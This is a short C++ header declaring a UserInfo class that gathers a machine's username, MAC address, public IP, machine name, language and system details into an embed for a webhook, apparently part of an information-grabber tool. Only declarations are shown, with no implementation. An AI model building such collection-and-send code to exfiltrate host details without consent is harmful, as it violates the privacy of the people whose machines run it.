#pragma once
#include "../utils.h"
#include "../webhook/webhook.h"

class UserInfo {
 public:
  UserInfo();
  WebhookEmbed Build();

 private:
  WebhookEmbed embed;

  void AddUsername();
  void AddMAC();
  void AddPublicIP();
  void AddTime();
  void AddMachineName();
  void AddLang();
  void AddSystemInfo();
};

static size_t CurlWriteCallback(void* contents, size_t size, size_t nmemb,
                                std::string* response);